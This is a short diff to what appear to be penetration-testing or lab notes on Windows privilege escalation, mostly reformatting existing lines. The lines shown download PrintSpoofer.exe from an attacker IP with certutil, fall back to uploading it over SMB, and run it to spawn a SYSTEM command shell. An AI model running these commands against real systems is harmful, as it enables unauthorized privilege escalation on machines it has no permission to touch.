@@ -191,10 +191,13 @@ Windows Privilege Escalation:
 
     PrintSpoofer.exe Attack
     cd c:\inetpub\wwwroot>
-        c:\inetpub\wwwroot>certutil.exe -urlcache -f http://10.6.1.162/PrintSpoofer.exe printspoofer.exe
+
+        certutil.exe -urlcache -f http://10.6.1.162/PrintSpoofer.exe printspoofer.exe
+
     If it NOT WORKING we will use SMB client
 
         smbclient //<IP>/nt4wrksv -Uguest:
+
             smb: \> put PrintSpoofer.exe
 
     c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
